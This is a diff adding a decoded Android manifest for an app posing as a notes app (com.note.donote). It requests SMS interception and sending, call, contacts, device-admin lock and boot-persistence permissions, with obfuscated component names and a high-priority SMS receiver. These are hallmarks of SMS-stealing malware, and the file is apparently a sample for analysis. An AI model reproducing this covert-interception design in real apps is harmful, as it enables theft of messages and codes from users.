@@ -1,0 +1,203 @@
+manifest
+- package: com.note.donote
+- platformBuildVersionName: 5.1.1-1819727
+- versionName: 1.0
+- platformBuildVersionCode: 22
+- versionCode: 1
+	uses-sdk
+	- minSdkVersion: 11
+	- targetSdkVersion: 22
+	uses-permission
+	- name: android.permission.RECEIVE_BOOT_COMPLETED
+	uses-permission
+	- name: android.permission.WAKE_LOCK
+	uses-permission
+	- name: android.permission.RECEIVE_SMS
+	uses-permission
+	- name: android.permission.SEND_SMS
+	uses-permission
+	- name: android.permission.READ_SMS
+	uses-permission
+	- name: android.permission.WRITE_SMS
+	uses-permission
+	- name: android.permission.CALL_PHONE
+	uses-permission
+	- name: android.permission.READ_PHONE_STATE
+	uses-permission
+	- name: android.permission.ACCESS_NETWORK_STATE
+	uses-permission
+	- name: android.permission.INTERNET
+	uses-permission
+	- name: android.permission.READ_CONTACTS
+	uses-permission
+	- name: android.permission.GET_TASKS
+	uses-permission
+	- name: android.permission.WRITE_SETTINGS
+	uses-permission
+	- name: android.permission.VIBRATE
+	uses-permission
+	- name: android.permission.USES_POLICY_FORCE_LOCK
+	uses-permission
+	- name: android.permission.ACCESS_WIFI_STATE
+	uses-permission
+	- name: android.permission.CHANGE_WIFI_STATE
+	uses-permission
+	- name: android.permission.CHANGE_NETWORK_STATE
+	application
+	- icon: 2130837566
+	- name: o.ᴺ
+	- theme: 2131296488
+	- label: 2131165198
+	- allowBackup: true
+		activity
+		- name: .activities.MainActivity
+		- noHistory: true
+		- label: 2131165198
+		- screenOrientation: 1
+			intent-filter
+				action
+				- name: android.intent.action.MAIN
+				category
+				- name: android.intent.category.DEFAULT
+				category
+				- name: android.intent.category.LAUNCHER
+		activity
+		- screenOrientation: 1
+		- name: o.ṛ
+		activity
+		- name: o.ῑ
+		- theme: 2131296421
+		- screenOrientation: 1
+		activity
+		- name: o.ὶ
+		- theme: 2131296421
+		- screenOrientation: 1
+		activity
+		- name: o.⁔
+		- theme: 2131296421
+		- screenOrientation: 1
+		activity
+		- name: o.灬
+		- windowSoftInputMode: 32
+		- theme: 2131296421
+		- screenOrientation: 1
+		activity
+		- name: o.ﹽ
+		- theme: 2131296421
+		- screenOrientation: 1
+		activity
+		- name: o.ỉ
+		- theme: 2131296421
+		- screenOrientation: 1
+		activity
+		- name: .activities.sms.ComposeSmsActivity
+			intent-filter
+				action
+				- name: android.intent.action.SEND
+				action
+				- name: android.intent.action.SENDTO
+				category
+				- name: android.intent.category.DEFAULT
+				category
+				- name: android.intent.category.BROWSABLE
+				data
+				- scheme: sms
+				data
+				- scheme: smsto
+				data
+				- scheme: mms
+				data
+				- scheme: mmsto
+		receiver
+		- exported: true
+		- name: .receivers.sms.SmsReceiver_
+			intent-filter
+			- priority: 999
+				action
+				- name: android.provider.Telephony.SMS_RECEIVED
+		receiver
+		- name: .receivers.sms.MmsReceiver
+		- permission: android.permission.BROADCAST_SMS
+			intent-filter
+				action
+				- name: android.provider.Telephony.SMS_DELIVER
+		receiver
+		- name: .receivers.sms.PushServiceReciever
+		- permission: android.permission.BROADCAST_WAP_PUSH
+		- enabled: true
+			intent-filter
+				action
+				- name: android.provider.Telephony.WAP_PUSH_DELIVER
+				data
+				- mimeType: application/vnd.wap.mms-message
+		service
+		- exported: true
+		- name: .services.sms.HeadlessSmsSendService
+		- permission: android.permission.SEND_RESPOND_VIA_MESSAGE
+			intent-filter
+				action
+				- name: android.intent.action.RESPOND_VIA_MESSAGE
+				category
+				- name: android.intent.category.DEFAULT
+				data
+				- scheme: sms
+				data
+				- scheme: smsto
+				data
+				- scheme: mms
+				data
+				- scheme: mmsto
+		receiver
+		- exported: true
+		- name: .receivers.BootReceiver
+		- enabled: true
+			intent-filter
+			- priority: 999
+				action
+				- name: android.intent.action.BOOT_COMPLETED
+				action
+				- name: android.intent.action.QUICKBOOT_POWERON
+		receiver
+		- name: .receivers.AdminReceiver
+		- description: 2131165202
+		- permission: android.permission.BIND_DEVICE_ADMIN
+		- label: 2131165201
+			meta-data
+			- name: android.app.device_admin
+			- resource: 2131034112
+			intent-filter
+				action
+				- name: android.app.action.DEVICE_ADMIN_ENABLED
+		service
+		- exported: true
+		- name: .services.USSDService
+		- enabled: true
+			intent-filter
+				action
+				- name: com.android.ussd.IExtendedNetworkService
+		service
+		- name: o.ﺀ
+		service
+		- name: o.ﮆ
+		service
+		- name: o.ﭝ
+		service
+		- name: o.Ī
+		service
+		- name: o.ﬧ
+		service
+		- name: o.ⅽ
+		receiver
+		- name: .receivers.ServiceDestroyReceiver
+			intent-filter
+				action
+				- name: com.KHLCert.gpservice
+				action
+				- name: com.KHLCert.fdservice
+		receiver
+		- exported: true
+		- name: .receivers.AlarmReceiver
+		- enabled: true
+			intent-filter
+				action
+				- name: MainActivity.AlarmAction
